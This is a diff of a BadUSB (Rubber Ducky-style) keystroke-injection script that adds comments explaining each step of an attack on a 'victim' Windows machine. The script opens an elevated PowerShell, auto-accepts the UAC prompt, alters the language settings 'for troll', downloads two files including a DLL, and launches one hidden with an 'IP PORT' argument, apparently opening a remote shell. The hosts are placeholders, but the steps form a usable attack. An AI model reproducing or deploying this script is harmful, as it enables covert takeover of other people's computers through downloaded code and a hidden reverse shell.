@@ -4,23 +4,29 @@ DELAY 1000
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
 DELAY 3000
+REM run as admin UAC prompt. "o" is to change depending on victim language. in french "o" for Oui. English would be "ALT y" for Yes
 ALT o
 DELAY 2000
+REM making sure everything that is typed in ill be in the good language. Russian (ru) is for troll
 STRING Set-WinUserLanguageList -LanguageList en-US, ru -Force
 ENTER
 DELAY 750
+REM create temp folder in case.
 STRING New-Item -ItemType directory -Path C:\temp
 ENTER
 DELAY 750
 STRING cd C:\temp
 ENTER
 DELAY 750
+REM download first file
 STRING Invoke-WebRequest -Uri <FILE> -OutFile <FILE>
 ENTER
 DELAY 2000
+REM second file such as dll
 STRING Invoke-WebRequest -Uri <FILE> -OutFile <FILE.dll>
 ENTER
 DELAY 2000
+REM execution and stealth
 STRING Start-Process C:\temp\s<FILE> -ArgumentList '-c powershell IP PORT' -WindowStyle hidden
 ENTER
 DELAY 750
